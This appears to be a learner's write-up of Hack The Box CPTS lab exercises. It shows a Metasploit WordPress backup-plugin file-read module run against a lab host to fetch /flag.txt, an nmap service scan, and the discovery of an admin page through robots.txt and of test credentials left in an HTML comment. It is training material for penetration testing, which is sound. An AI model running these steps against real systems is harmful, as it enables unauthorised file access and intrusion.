# Hack The Box CPTS

Me and a hacker have decided to go for our Hack The Box CPTS certification. Welcome to our journey


## Section 8 Service Scanning box

Flag: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)


### Service Enumeration
IP: http://154.57.164.72:31179/

Navigating to that IP/port shows us the following:

![alt text](images/section8box.png)


Nice information disclosure, one of my favorite and most common pentest findings. I use AI to find the `auxiliary/scanner/http/wp_simple_backup_file_read` metasploit module


### metasploit

~~~
msf auxiliary(scanner/http/wordpress_scanner) > use auxiliary/scanner/http/wp_simple_backup_file_read
msf auxiliary(scanner/http/wp_simple_backup_file_read) > options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, http, socks4, socks5,
                                          socks5h
   RHOSTS     154.57.164.72    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      31179            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
msf auxiliary(scanner/http/wp_simple_backup_file_read) > run
[+] File saved in: /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/wp_simple_backup_file_read) > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] exec: cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt

HTB{REDACTED}
~~~

Done :) 

## Section 9 Web Enumeration

This section talked about finding public exploits by google *technology name* + exploit. It also talked about searchsploit and metasploit. 


_Flag: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)_


### nmap 
~~~
➜  ~ nmap -sV -p 30764 154.57.164.63
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 14:04 -0600
Nmap scan report for 154-57-164-63.static.isp.htb.systems (154.57.164.63)
Host is up (0.078s latency).

PORT      STATE SERVICE VERSION
30764/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
~~~

Going to the web server, I get greeted with this 

![alt text](images/Section9.png)

I inspect the webpage:

~~~</html>
<!DOCTYPE html>

<head>
    <title>HTB Academy</title>
    <style>
        *,
        html {
            margin: 0;
            padding: 0;
            border: 0;
        }

        html {
            width: 100%;
            height: 100%;
        }

        body {
            width: 100%;
            height: 100%;
            position: relative;
            background-color: rgb(42, 48, 66);
        }

        .center {
            width: 100%;
            height: 50%;
            margin: 0;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-family: "Helvetica", Helvetica, sans-serif;
            text-align: center;
        }

        h1 {
            font-size: 144px;
        }

        p {
            font-size: 64px;
        }
    </style>
</head>

<body>
    <div class="center">
        <h1>Welcome to HTB Academy Blog</h1>
    </div>
</body>

</html>
~~~


I try `robots.txt`:

http://154.57.164.63:30764/robots.txt

```
User-agent: *
Disallow: /admin-login-page.php
````

You disallow robots, but not humans; lets check it out

![alt text](images/2.png)

View page source:

~~~
<!DOCTYPE html>
<html>
<style>
    body {
        background-color: #151D2B;
    }

    form {
        background-color: #1A2332;
        width: 25%;
        margin: auto;
        border-radius: 10px;
        color: white;
        font-family: Arial, Helvetica, sans-serif;
    }

    input[type=text],
    input[type=password] {
        background-color: #101927;
        width: 100%;
        padding: 12px 20px;
        margin: 8px 0;
        display: inline-block;
        border: 1px solid #101927;
        box-sizing: border-box;
        border-radius: 10px;
        color: white;
    }

    button {
        background-color: #2A86FF;
        color: white;
        padding: 14px 20px;
        margin: 8px 0;
        border: none;
        cursor: pointer;
        width: 100%;
        border-radius: 10px;
    }

    button:hover {
        opacity: 0.8;
    }

    .container {
        padding: 16px;
    }
</style>

<body>
                <form name='login' autocomplete='off' class='form' action='' method='post'>
            <div class='control'>
                <h1>
                    Admin Panel
                </h1>
            </div>
            <div class="container">
                <label for="username"><b>Username</b></label>
                <input name='username' placeholder='Username' type='text'>

                <label for="password"><b>Password</b></label>
                <input name='password' placeholder='Password' type='password'>

                <!-- TODO: remove test credentials admin:password123 -->

                <button type="submit" formmethod='post'>Login</button>
            </div>
        </form>
    </body>

</html>
~~~

Flag: HTB{REDACTED}

## Section 11 

_Flag1: SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'._





